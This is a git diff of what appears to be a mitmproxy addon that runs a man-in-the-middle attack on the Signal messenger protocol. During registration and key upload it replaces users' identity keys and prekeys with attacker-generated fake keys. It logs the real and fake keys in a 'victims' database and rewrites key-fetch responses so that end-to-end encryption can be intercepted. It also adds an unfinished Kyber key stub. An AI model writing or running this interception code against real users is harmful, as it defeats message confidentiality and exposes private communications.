@@ -16,6 +16,7 @@ from proto_python.SignalService_pb2 import *
 from proto_python.sealed_sender_pb2 import *
 from proto_python import *
 from test_protocol_wip import *
+from kyber_protocol import kyber
 
 protocol_runs = dict()
 once = False
@@ -44,7 +45,7 @@ def get_or_create_identityKey(conn: sqlite3.Connection, sender: str, recv: str, 
     statement = '''
     INSERT OR IGNORE INTO end2end (v_aci, recv_aci, deviceId, recv_IdenKey, recv_FakeIdenKey) VALUES (?,?,?,?,?)
     '''
-    recv_FakeIdenKey = json.dumps(fake_key_gen()["identityKey"])
+    recv_FakeIdenKey = json.dumps(fake_key_gen_curve()["identityKey"])
     ctx.log.warn((sender,recv, recv_IdenKey, recv_FakeIdenKey))
 
     cur.execute(statement,(sender,recv, deviceID, recv_IdenKey,  recv_FakeIdenKey,))
@@ -60,8 +61,13 @@ def get_or_create_identityKey(conn: sqlite3.Connection, sender: str, recv: str, 
         print("sth went terribly wrong!")
     return json.loads(res[0])['publicKey']
 
+def fake_key_gen_krystal():
+    fake_key = kyber.Kyber1024()
+    pk, sk = fake_key.keygen()
+    
+    
 
-def fake_key_gen(preKeysId=1, signedKeyId=1): # CHANGE
+def fake_key_gen_curve(preKeysId=1, signedKeyId=1): # CHANGE
     try_run("node ./node-signal/index.js")
 
     p = subprocess.Popen(
@@ -133,7 +139,87 @@ def request(flow: http.HTTPFlow):
         knownUser = isKnownUser(cur, target)
         # ctx.log(f"Bearer token: {bearer} (known: {knownUser})")
         # ctx.log(target)
+        
+    if "/v1/registration" in flow.request.path and flow.request.method == "POST":
+            try:
+                resp = json.loads(flow.response.content)
+                req = json.loads(flow.request.content)
+            except Exception as e:
+                ctx.log.error(f"{e.msg},\n\t{flow.response.content.decode()}")
+            with open("resp.json", "w") as f:
+                f.write(json.dumps(resp))
+            ctx.log.warn(json.dumps(req, indent=4))
 
+            aci_IdenKey = req['aciIdentityKey']
+            pni_IdenKey = req['pniIdentityKey']
+            
+            aci_SignedPreKey = req['aciSignedPreKey']
+            pni_SignedPreKey = req['pniSignedPreKey']
+
+            aci_fake_keys = fake_key_gen_curve(
+                signedKeyId=req["aciSignedPreKey"]["keyId"],
+                preKeysId=1,
+            )
+            
+            aci_fake_IdenKey = aci_fake_keys["identityKey"]
+            aci_fake_SignedPreKey = aci_fake_keys["signedPreKey"]
+
+            pni_fake_keys = fake_key_gen_curve(
+                signedKeyId=req["pniSignedPreKey"]["keyId"],
+                preKeysId=1,
+            )
+            pni_fake_IdenKey = pni_fake_keys["identityKey"]
+            pni_fake_SignedPreKey = pni_fake_keys["signedPreKey"]
+            
+            for identity in ["aci", "pni"]:
+                
+                query = f"UPDATE victims SET aciIdenKey = ?, aciSignedPreKey = ?, pniIdenKey = ?, pniSignedPreKey = ?, aciFakeIdenKey = ?, aciFakeSignedPreKey = ?, pniFakeIdenKey = ?, pniFakeSignedPreKey = ? WHERE pNumber = ? OR aci = ?"
+                params = (
+                    json.dumps(aci_IdenKey),
+                    json.dumps(aci_SignedPreKey),
+                    json.dumps(pni_IdenKey),
+                    json.dumps(pni_SignedPreKey),
+                    json.dumps(aci_fake_IdenKey),
+                    json.dumps(aci_fake_SignedPreKey),
+                    json.dumps(pni_fake_IdenKey),
+                    json.dumps(pni_fake_SignedPreKey),
+                    target,
+                    target,
+                )
+
+                cur.execute(query, params)
+
+            conn.commit()
+            
+            req['aciIdentityKey'] = aci_fake_keys["identityKey"]["publicKey"]
+            req['pniIdentityKey'] = pni_fake_keys["identityKey"]["publicKey"]
+            #req['deviceActivationRequest'] = {}
+            req['aciPqLastResortPreKey'] = aci_fake_keys["signedPreKey"]["publicKey"]
+            req['pniPqLastResortPreKey'] = pni_fake_keys["signedPreKey"]["publicKey"]
+            aci_fake_keys["signedPreKey"].pop("privateKey")
+            pni_fake_keys["signedPreKey"].pop("privateKey")
+            req['aciSignedPreKey'] = aci_fake_keys["signedPreKey"]
+            req['pniSignedPreKey'] = pni_fake_keys["signedPreKey"]
+            req['exactlyOneMessageDeliveryChannel'] = ""
+            req['everySignedKeyValid'] = ""
+            ctx.log.warn(json.dumps(req, indent=4))
+    
+            conn = sqlite3.connect("mitm.db")
+            cur = conn.cursor()
+            try:
+                pNumber, aci, pni, unidentifiedAccessKey = (
+                    resp["number"],
+                    resp["uuid"],
+                    resp["pni"],
+                    req["accountAttributes"]["unidentifiedAccessKey"],
+                )
+                cur.execute(
+                    f"""INSERT INTO victims (pNumber, aci, pni, unidentifiedAccessKey, aciIdenKey, pniIdenKey, aciSignedPreKey, pniSignedPreKey, aciPreKeys, pniPreKeys,aciFakeIdenKey, pniFakeIdenKey, aciFakeSignedPreKey, pniFakeSignedPreKey, aciFakePrekeys, pniFakePreKeys) VALUES (?, ?, ?, ?, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )""",
+                    (pNumber, aci, pni, unidentifiedAccessKey),
+                )
+                conn.commit()
+            except Exception:
+                pass
     if "/v2/keys" in flow.request.path and flow.request.method == "PUT":
         # make it a method, for example (replace_keys())
         if not knownUser:
@@ -157,7 +243,7 @@ def request(flow: http.HTTPFlow):
             json.dumps(keys["preKeys"]),
         )
 
-        fake_keys = fake_key_gen(
+        fake_keys = fake_key_gen_curve(
             signedKeyId=1,
             preKeysId=keys["preKeys"][0]["keyId"],
         )
@@ -215,86 +301,86 @@ def response(flow: http.HTTPFlow):
         # sql query to check if target in aci or pnumber
         knownUser = isKnownUser(cur, target)
 
-    if "/v1/registration" in flow.request.path and flow.request.method == "POST":
-        try:
-            resp = json.loads(flow.response.content)
-            req = json.loads(flow.request.content)
-        except Exception as e:
-            ctx.log.error(f"{e.msg},\n\t{flow.response.content.decode()}")
-        with open("resp.json", "w") as f:
-            f.write(json.dumps(resp))
-        ctx.log.warn(json.dumps(req, indent=4))
+    # if "/v1/registration" in flow.request.path and flow.request.method == "POST":
+    #     try:
+    #         resp = json.loads(flow.response.content)
+    #         req = json.loads(flow.request.content)
+    #     except Exception as e:
+    #         ctx.log.error(f"{e.msg},\n\t{flow.response.content.decode()}")
+    #     with open("resp.json", "w") as f:
+    #         f.write(json.dumps(resp))
+    #     ctx.log.warn(json.dumps(req, indent=4))
 
-        aci_IdenKey = req['aciIdentityKey']
-        pni_IdenKey = req['pniIdentityKey']
+    #     aci_IdenKey = req['aciIdentityKey']
+    #     pni_IdenKey = req['pniIdentityKey']
         
-        aci_SignedPreKey = req['aciSignedPreKey']
-        pni_SignedPreKey = req['pniSignedPreKey']
+    #     aci_SignedPreKey = req['aciSignedPreKey']
+    #     pni_SignedPreKey = req['pniSignedPreKey']
 
-        aci_fake_keys = fake_key_gen(
-            signedKeyId=req["aciSignedPreKey"]["keyId"],
-            preKeysId=1,
-        )
+    #     aci_fake_keys = fake_key_gen(
+    #         signedKeyId=req["aciSignedPreKey"]["keyId"],
+    #         preKeysId=1,
+    #     )
         
-        aci_fake_IdenKey = aci_fake_keys["identityKey"]
-        aci_fake_SignedPreKey = aci_fake_keys["signedPreKey"]
+    #     aci_fake_IdenKey = aci_fake_keys["identityKey"]
+    #     aci_fake_SignedPreKey = aci_fake_keys["signedPreKey"]
 
-        pni_fake_keys = fake_key_gen(
-            signedKeyId=req["pniSignedPreKey"]["keyId"],
-            preKeysId=1,
-        )
-        pni_fake_IdenKey = pni_fake_keys["identityKey"]
-        pni_fake_SignedPreKey = pni_fake_keys["signedPreKey"]
+    #     pni_fake_keys = fake_key_gen(
+    #         signedKeyId=req["pniSignedPreKey"]["keyId"],
+    #         preKeysId=1,
+    #     )
+    #     pni_fake_IdenKey = pni_fake_keys["identityKey"]
+    #     pni_fake_SignedPreKey = pni_fake_keys["signedPreKey"]
         
-        for identity in ["aci", "pni"]:
+    #     for identity in ["aci", "pni"]:
             
-            query = f"UPDATE victims SET aciIdenKey = ?, aciSignedPreKey = ?, pniIdenKey = ?, pniSignedPreKey = ?, aciFakeIdenKey = ?, aciFakeSignedPreKey = ?, pniFakeIdenKey = ?, pniFakeSignedPreKey = ? WHERE pNumber = ? OR aci = ?"
-            params = (
-                json.dumps(aci_IdenKey),
-                json.dumps(aci_SignedPreKey),
-                json.dumps(pni_IdenKey),
-                json.dumps(pni_SignedPreKey),
-                json.dumps(aci_fake_IdenKey),
-                json.dumps(aci_fake_SignedPreKey),
-                json.dumps(pni_fake_IdenKey),
-                json.dumps(pni_fake_SignedPreKey),
-                target,
-                target,
-            )
+    #         query = f"UPDATE victims SET aciIdenKey = ?, aciSignedPreKey = ?, pniIdenKey = ?, pniSignedPreKey = ?, aciFakeIdenKey = ?, aciFakeSignedPreKey = ?, pniFakeIdenKey = ?, pniFakeSignedPreKey = ? WHERE pNumber = ? OR aci = ?"
+    #         params = (
+    #             json.dumps(aci_IdenKey),
+    #             json.dumps(aci_SignedPreKey),
+    #             json.dumps(pni_IdenKey),
+    #             json.dumps(pni_SignedPreKey),
+    #             json.dumps(aci_fake_IdenKey),
+    #             json.dumps(aci_fake_SignedPreKey),
+    #             json.dumps(pni_fake_IdenKey),
+    #             json.dumps(pni_fake_SignedPreKey),
+    #             target,
+    #             target,
+    #         )
 
-            cur.execute(query, params)
+    #         cur.execute(query, params)
 
-        conn.commit()
+    #     conn.commit()
         
-        req['aciIdentityKey'] = aci_fake_keys["identityKey"]["publicKey"]
-        req['pniIdentityKey'] = pni_fake_keys["identityKey"]["publicKey"]
-        #req['deviceActivationRequest'] = {}
-        req['aciPqLastResortPreKey'] = aci_fake_keys["signedPreKey"]["publicKey"]
-        req['pniPqLastResortPreKey'] = pni_fake_keys["signedPreKey"]["publicKey"]
-        aci_fake_keys["signedPreKey"].pop("privateKey")
-        pni_fake_keys["signedPreKey"].pop("privateKey")
-        req['aciSignedPreKey'] = aci_fake_keys["signedPreKey"]
-        req['pniSignedPreKey'] = pni_fake_keys["signedPreKey"]
-        req['exactlyOneMessageDeliveryChannel'] = ""
-        req['everySignedKeyValid'] = ""
-        ctx.log.warn(json.dumps(req, indent=4))
+    #     req['aciIdentityKey'] = aci_fake_keys["identityKey"]["publicKey"]
+    #     req['pniIdentityKey'] = pni_fake_keys["identityKey"]["publicKey"]
+    #     #req['deviceActivationRequest'] = {}
+    #     req['aciPqLastResortPreKey'] = aci_fake_keys["signedPreKey"]["publicKey"]
+    #     req['pniPqLastResortPreKey'] = pni_fake_keys["signedPreKey"]["publicKey"]
+    #     aci_fake_keys["signedPreKey"].pop("privateKey")
+    #     pni_fake_keys["signedPreKey"].pop("privateKey")
+    #     req['aciSignedPreKey'] = aci_fake_keys["signedPreKey"]
+    #     req['pniSignedPreKey'] = pni_fake_keys["signedPreKey"]
+    #     req['exactlyOneMessageDeliveryChannel'] = ""
+    #     req['everySignedKeyValid'] = ""
+    #     ctx.log.warn(json.dumps(req, indent=4))
   
-        conn = sqlite3.connect("mitm.db")
-        cur = conn.cursor()
-        try:
-            pNumber, aci, pni, unidentifiedAccessKey = (
-                resp["number"],
-                resp["uuid"],
-                resp["pni"],
-                req["accountAttributes"]["unidentifiedAccessKey"],
-            )
-            cur.execute(
-                f"""INSERT INTO victims (pNumber, aci, pni, unidentifiedAccessKey, aciIdenKey, pniIdenKey, aciSignedPreKey, pniSignedPreKey, aciPreKeys, pniPreKeys,aciFakeIdenKey, pniFakeIdenKey, aciFakeSignedPreKey, pniFakeSignedPreKey, aciFakePrekeys, pniFakePreKeys) VALUES (?, ?, ?, ?, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )""",
-                (pNumber, aci, pni, unidentifiedAccessKey),
-            )
-            conn.commit()
-        except Exception:
-            pass
+    #     conn = sqlite3.connect("mitm.db")
+    #     cur = conn.cursor()
+    #     try:
+    #         pNumber, aci, pni, unidentifiedAccessKey = (
+    #             resp["number"],
+    #             resp["uuid"],
+    #             resp["pni"],
+    #             req["accountAttributes"]["unidentifiedAccessKey"],
+    #         )
+    #         cur.execute(
+    #             f"""INSERT INTO victims (pNumber, aci, pni, unidentifiedAccessKey, aciIdenKey, pniIdenKey, aciSignedPreKey, pniSignedPreKey, aciPreKeys, pniPreKeys,aciFakeIdenKey, pniFakeIdenKey, aciFakeSignedPreKey, pniFakeSignedPreKey, aciFakePrekeys, pniFakePreKeys) VALUES (?, ?, ?, ?, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )""",
+    #             (pNumber, aci, pni, unidentifiedAccessKey),
+    #         )
+    #         conn.commit()
+    #     except Exception:
+    #         pass
 
     matches = re.match("\/v2\/keys\/([\w+-]+)\/(\*|\d)", flow.request.path)
     if matches and flow.request.method == "GET":
@@ -332,7 +418,7 @@ def response(flow: http.HTTPFlow):
         
         for i, device in enumerate(devices):
             # ctx.log(params)
-            fake_keys = fake_key_gen(
+            fake_keys = fake_key_gen_curve(
                 preKeysId=device["preKey"]["keyId"],
                 signedKeyId=device["signedPreKey"]["keyId"],
             )
